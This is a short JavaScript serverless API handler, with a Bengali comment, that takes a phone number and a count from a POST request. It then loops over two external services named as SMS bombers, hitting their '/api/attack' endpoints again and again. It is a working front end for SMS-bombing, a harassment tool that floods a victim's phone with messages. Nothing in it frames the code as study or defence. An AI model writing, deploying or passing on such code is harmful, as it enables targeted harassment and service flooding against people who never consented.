export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { number, amount } = req.body;

    if (!number) {
        return res.status(400).json({ error: 'Number is required' });
    }

    // আপনার আসল Backend API Endpoint গুলো এখানে বসান
    const targetApis = [
        'https://shadowx-sms-bomber.onrender.com/api/attack', 
        'https://nuke-sms-bomber.pages.dev/api/attack'
    ];

    let successCount = 0;

    for (let i = 0; i < (amount || 1); i++) {
        for (const api of targetApis) {
            try {
                await fetch(api, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: number, amount: 1 })
                });
                successCount++;
            } catch (err) {
                console.error("API Fetch Error:", err);
            }
        }
    }

    return res.status(200).json({ success: true, sentRequests: successCount });
}
